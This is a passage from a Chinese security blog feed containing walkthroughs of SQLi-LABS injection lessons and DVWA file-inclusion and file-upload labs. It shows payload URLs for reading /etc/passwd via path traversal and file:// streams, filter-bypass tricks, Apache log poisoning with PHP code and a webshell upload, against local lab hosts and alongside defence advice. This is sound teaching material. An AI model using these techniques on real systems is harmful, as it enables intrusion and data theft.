13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h2><p>单引号报错</p><p><img src="20190327011635743.png" alt></p><p>知道是(‘变量’)闭合，可是却没有显示信息</p><p><img src="20190327011646781.png" alt></p><p>那么就用双注入查库</p><p><img src="20190327011657366.png" alt></p><p>查表</p><p><img src="20190327011712048.png" alt></p><p>其余操作前面有不再细说。</p><h2 id="less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="less 14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>less 14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h2><p>变为双引号闭合，操作同less 13</p><p><img src="20190327011732912.png" alt></p><h2 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注" class="headerlink" title="less 15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)"></a>less 15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</h2><p>错误信息被隐藏了，所以只能用盲注。</p><p><img src="20190327011748231.png" alt></p><p>说明是单引号闭合<br>数据库名长度为8</p><p><img src="20190327011759626.png" alt></p><p>数据库名第一个字母ASCII为115</p><p><img src="20190327011811388.png" alt></p><p>二分法加limit得到所有数据表名字</p><p><img src="20190327011822831.png" alt></p><p>同理可得到字段名，以及数据。</p><p>如果我插入<code>uname=1&amp;passwd=2&#39; or sleep(5) -- k</code>会延迟1分多最后什么也没有显示。在cmd中返回为空</p><p><img src="20190327011835149.png" alt></p><p>原来是<code>false or sleep(5)</code>最后返回为0,最后就什么也查不到。</p><p><img src="20190327011858091.png" alt></p><p><strong>and与or的截断性</strong></p><p>在SQL语句中如果and前面为false那么后面的语句就不会执行。<br>如果or前面为true那么后面的语句就不会执行。</p><h2 id="less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注"><a href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注" class="headerlink" title="less 16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)"></a>less 16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</h2><p>同15，这里用时间延迟盲注</p><p>说明是(“闭合”)</p><p><img src="20190327011959345.png" alt></p><p>lenth=8时不会延迟，说明数据库名字长度为8</p><p><img src="20190327012007235.png" alt></p><p>其他把length函数换成select的操作同less 7</p><h2 id="less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="less 17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>less 17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h2><p>注意：下面的注入，一不小心可能把数据库的user表的密码表给清空了</p><p><a href="http://www.w3school.com.cn/xpath/" target="_blank" rel="noopener">xpath教程</a><br><a href="http://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="noopener">UpdateXml() MYSQL显错注入</a></p><p><img src="20190327012200415.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个参数是 目标xml</span><br><span class="line">第二个参数是 xpath的表达式，这个看w3c那个xpath教程</span><br><span class="line">第三个参数是 要将xpath的表达式的东西将目标xml替换成什么</span><br></pre></td></tr></table></figure><p><img src="20190327012230713.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">    &#123;</span><br><span class="line">    if(!empty($value))</span><br><span class="line">        &#123;</span><br><span class="line">        $value = substr($value,0,15);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // // 去除斜杠</span><br><span class="line">        if (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        // 如果不是数字则加引号并转义</span><br><span class="line">        if (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">//是数字也要用intval转化成int，因为传过来的是字符型数字              </span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    return $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">check_input函数首先判断如果不为空，就截取前15个字符。</span><br><span class="line">当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1</span><br><span class="line">当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/senlin1202/article/details/50799967" target="_blank" rel="noopener">magic_quotes_gpc函数</a><br><a href="http://www.w3school.com.cn/php/func_string_addslashes.asp" target="_blank" rel="noopener">addslashes函数</a><br><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="noopener">stripslashes函数</a><br><a href="http://php.net/manual/zh/function.ctype-digit.php" target="_blank" rel="noopener">ctype_digit函数</a><br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string函数</a></p><p><img src="20190327012512983.png" alt></p><p>首先通过用户名找到用户名和密码，接着更新那个用户名的密码为新输入的密码。</p><p>首先要绕过通过用户名查询出用户名和密码，这个我们只能猜吧，比如admin，root，test什么的，这个可以用字典在这里我们就当知道是admin了，直接用admin就考虑下一步</p><p><img src="20190327012525134.png" alt></p><p>这里是单引号闭合，直接用updatexml显错注入。</p><p><img src="20190327012534475.png" alt></p><p><img src="20190327012543876.png" alt></p><p>查表</p><p><img src="20190327012558948.png" alt></p><p>查列</p><p><img src="20190327012613692.png" alt></p><p>查数据</p><p><img src="20190327012620995.png" alt></p><h2 id="less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="less 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>less 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h2><p>这里对用户名和密码都加了过滤</p><p><img src="20190327012633827.png" alt></p><p>正常登陆后显示User Agent<br>用burp抓包改包，先在后面加单引号出现报错信息</p><p><img src="20190327012643631.png" alt></p><p>可以知道闭合方式为(‘变量’,’变量’,’变量’)，继续用updatexml显错注入</p><p><img src="20190327012653168.png" alt></p><h2 id="less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="less 19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>less 19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h2><p>正常登陆后显示的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your Referer is: http://127.0.0.1/sqli-labs-master/Less-18/</span><br></pre></td></tr></table></figure></p><p>抓包改包，referer后加个单引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;127.0.0.1&apos;)&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>可以猜测闭合方式为(‘变量’,’变量’)也可以用updatexml</p><p><img src="20190327012721416.png" alt></p><p>还有另一个报错函数extractvalue<br>第一个参数也是个xml，第二个参数就是xpath的表达式，这个函数是获取xml中某个节点的值</p><p><img src="20190327012730874.png" alt></p><p><img src="20190327012740002.png" alt></p><h2 id="less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="less 20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)"></a>less 20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</h2><p>两种方式</p><p>1 登陆的时候抓包在cookie后面加单引号</p><p><img src="20190327012752819.png" alt></p><p>可以知道是单引号闭合，然后通过联合查询知道有3列</p><p><img src="20190327012759666.png" alt></p><p>然后就可以用concat函数获得数据。</p><p>2.已经登陆并且有了cookie</p><p><img src="20190327012811914.png" alt></p><h2 id="less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><a href="#less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入" class="headerlink" title="less 21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)"></a>less 21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</h2><p>抓包发现cookie经过了base64编码</p><p><img src="20190327012823454.png" alt></p><p>对admin’进行base64编码并发送过去发现报错信息</p><p><img src="20190327012954436.png" alt></p><p>可以知道是(‘变量’)闭合方式<br>对SQL语句进行BASE64编码并发送</p><p><img src="20190327012833476.png" alt></p><p><img src="20190327013018759.png" alt></p><p>其余同之前的操作</p><h2 id="less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="less 22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>less 22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h2><p>这个跟less 21一样只不过闭合方式变成了(“变量”)</p><p><img src="20190327013032104.png" alt></p><p><img src="20190327013041026.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;SQLi-LABS 学习SQL注入(less 1-less 22)&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="sql注入" scheme="http://archimesan.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（八）文件包含漏洞</title>
    <link href="http://archimesan.me/2018/05/30/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AB%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://archimesan.me/2018/05/30/DVWA学习（八）文件包含漏洞/</id>
    <published>2018-05-30T15:01:46.000Z</published>
    <updated>2019-03-26T15:18:40.360Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（八）文件包含漏洞<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函<code>include()，require()和include_once()，require_once()</code>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p><p>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p><p><strong>本地文件包含(Loacl File Inclusion,LFI)</strong><br>通过浏览器引进(包含)web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行。</p><p><strong>远程文件包含(Remote File Inclusion,RFI)</strong><br>该漏洞允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码</p><p>系统中常见的敏感信息路径如下：<br><strong>（1）Windows系统</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110437127.png" alt></p><p><strong>（2）Linux系统</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110513075.png" alt></p><h2 id="LOW难度"><a href="#LOW难度" class="headerlink" title="LOW难度"></a>LOW难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>page参数没有任何过滤。点击三个文件名，服务器会包含相应的文件,page参数是不可控的。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110534603.png" alt></p><p>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>绝对路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=/etc/passwd</span><br></pre></td></tr></table></figure></p><p>../返回上级目录，可以用多次先返回到根目录然后再进入目标目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110614541.png" alt></p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在主机服务器创建test.txt文件</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110659419.png" alt></p><p>构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/page=http://192.168.86.1/test.txt</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110957543.png" alt></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">// Input validation</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用str_replace函数过滤了<code>http://</code>和<code>https://</code>，以及<code>../</code>和<code>..</code>。</p><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>远程文件包含：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=htthttp://p://192.168.86.1/test.txt</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111118415.png" alt></p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">// This isn&apos;t the page we want!</span><br><span class="line">echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">// This isn&apos;t the page we want!</span><br><span class="line">echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个if语句的意思是如果page中不含有file并且page不等于include.php服务器才不回去包含相应的文件。两个条件只要不满足其中之一就可以，要么page等于include.php,要么page含有file。用<code>file://</code>流访问本地文件系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=file:///etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111311487.png" alt></p><p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;</span><br><span class="line">// This isn&apos;t the page we want!</span><br><span class="line">echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>采用白名单机制进行防护，，page参数必须为<code>include.php、file1.php、file2.php、file3.php</code>之一，彻底杜绝了文件包含漏洞。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>1.包含Apache日志文件：</strong></p><p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志),和error.log(错误日志),Apache的访问日志文件记录了客户端的每次请求以及服务器响应的相关信息。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111439128.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111448122.png" alt></p><p>当访问一个不存在的资源的时候，Apache日志文件同样会记录，这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ww.XXX.com/&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p>Apache会记录请求<code>&lt;?php phpinfo();?&gt;</code>，并写到access.log 文件中，这时再去包含Apache日志文件，就可以利用文件包含漏洞了。<br>但是访问URL后，一句话木马在日志文件中变形了，这是由于URL编码的缘故。PHP中的&lt;&gt;都被浏览器转码了，但是可以通过burp抓包绕过编码。<br>前提是攻击者知道Apache的日志路径。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111529411.png" alt></p><p>成功写入日志文件</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111538066.png" alt></p><p>因为MySQL用户权限不足，不能读取Apache的日志，需要提权操作。</p><p><strong>2.配合文件上传漏洞</strong></p><p>和文件上传漏洞或者SQL注入漏洞等一同利用，通过利用前面的漏洞将一句话木马1.php文件上传到Web服务器中，然后再通过文件包含漏洞包含出现从而得到shell。<br>例如上传了一个名为1.txt的文件，内容为：<br><code>&lt;?php phpinfo();?&gt;</code><br>直接包含该文件会将该文件以PHP来运行：</p><h3 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h3><p>1、严格判断包含中的参数是否外部可控。<br>2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：<code>../</code>。<br>3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。<br>4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：<code>include(&quot;head.php&quot;)</code>。<br>5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（八）文件包含漏洞&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（七）文件上传漏洞</title>
    <link href="http://archimesan.me/2018/05/26/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://archimesan.me/2018/05/26/DVWA学习（七）文件上传漏洞/</id>
    <published>2018-05-26T14:50:08.000Z</published>
    <updated>2019-03-27T10:53:42.554Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（七）文件上传漏洞<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。</p><p>保存一句话木马为muma.php</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105209604.png" alt></p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p><strong>源码</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105237101.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>basename() 函数返回路径中的文件名部分。<br>move_uploaded_file() 函数将上传的文件移动到新位置。<br>若成功，则返回 true，否则返回 false。<br>file 必需。规定要移动的文件。<br>newloc 必需。规定文件的新位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称</span><br><span class="line">DVWA_WEB_PAGE_TO_ROOT是网站根目录</span><br><span class="line">没有任何过滤，可以上传任意文件。</span><br><span class="line">上传muma.php显示了文件路径../../hackable/uploads/muma.php succesfully uploaded!用中国菜刀</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105329929.png" alt></p><p>然后菜刀就会通过向服务器发送包含haha参数的post请求，在服务器上执行任意命令，获取webshell权限。可以下载、修改服务器的所有文件。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105345580.png" alt></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; 